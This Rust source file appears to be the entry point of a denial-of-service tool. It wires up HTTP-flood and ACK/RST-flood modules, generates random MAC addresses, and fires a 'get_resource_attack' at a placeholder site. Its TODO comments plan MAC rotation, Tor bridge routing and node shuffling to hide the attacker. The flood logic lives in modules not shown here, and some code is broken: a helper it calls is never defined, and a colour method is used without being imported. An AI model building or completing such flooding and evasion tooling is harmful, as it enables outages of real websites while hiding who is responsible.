use std::error::Error;

mod http_flood;
mod ack_rst_flood;
mod utils;


use core::str::FromStr;
use rand::prelude::*;
use crate::SET_LOCAL_BIT;

#[derive(Debug)]
pub struct Mac {
    pub data: [u8; 6],
}

impl Mac {
    pub fn to_string(&self) -> String {
        format!(
            "{:02x}:{:02x}:{:02x}:{:02x}:{:02x}:{:02x}",
            self.data[0], self.data[1], self.data[2], self.data[3], self.data[4], self.data[5]
        )
    }

    pub fn new() -> Mac {
        Mac { data: [0u8; 6] }
    }

    pub fn new_random() -> Mac {
        let mac: [u8; 6] = [
            Mac::rand_octet(true),
            Mac::rand_octet(false),
            Mac::rand_octet(false),
            Mac::rand_octet(false),
            Mac::rand_octet(false),
            Mac::rand_octet(false),
        ];
        Mac { data: mac }
    }
    
    pub fn rand_octet(first: bool) -> u8 {
        //First boolean indicates whether the least significant bits will be flipped
        let array: [bool; 8];
        if first {
            array = [
                rand::thread_rng().gen(),
                rand::thread_rng().gen(),
                rand::thread_rng().gen(),
                rand::thread_rng().gen(),
                rand::thread_rng().gen(),
                rand::thread_rng().gen(),
                SET_LOCAL_BIT,
                false,
            ];

            if !SET_LOCAL_BIT {
                println!(
                    "{} Global bit generated Mac is set, This Mac address may cause problems.",
                    "Warn:".yellow()
                );
            }
        } else {
            array = [
                rand::thread_rng().gen(),
                rand::thread_rng().gen(),
                rand::thread_rng().gen(),
                rand::thread_rng().gen(),
                rand::thread_rng().gen(),
                rand::thread_rng().gen(),
                rand::thread_rng().gen(),
                rand::thread_rng().gen(),
            ];
        }

        Mac::octet_from_bool_arr(array)
    }
}


#[tokio::main]
async fn main() ->  Result<(),  Box<dyn Error>>{
    // @todo mac address changer(interval 600s) 
    // https://www.darpa.mil/program/translating-all-c-to-rust
    // https://learn.microsoft.com/en-us/windows/dev-environment/rust/rust-for-windows
    // https://microsoft.github.io/windows-docs-rs/doc/windows/Networking/Sockets/index.html
    // https://github.com/1Michael23/macchanger-rs/blob/master/src/main.rs
    // https://docs.rs/mac/0.1.1/mac/

    let mac_addr= Mac::to_string(&Mac::new_random());

    

    
    // @todo2 Shuffle network Node(If you have some nodes)
    // > https://docs.rs/nix/latest/nix/sys/socket/index.html
    // > https://learn.microsoft.com/en-us/azure/aks/virtual-nodes

    // @todo3 or conn Tor Bridge(default)
    // > https://zolagonano.github.io/blog/posts/making-a-tor-bridgedb-cli-interface-with-rust
    // > https://github.com/zolagonano/torbridge-cli





    // @todo4 miss-authentication application layer(if you need) 

    
    utils::show_logo();

    let site= ".example.com";
    let url: String= format!("https://www.{site}");
    let times= 2;
    let http_flood= http_flood::HttpFlood::new(url, times);

    let input_number=0_u16;

    match input_number {
        1 => http_flood.get_resource_attack().await,
        // 2 => http_flood.post_requeste_attack("body".to_string(), utils::get_text_data()).await,
        _ => println!("Unvalid code"),
    }
     
    Ok(())
}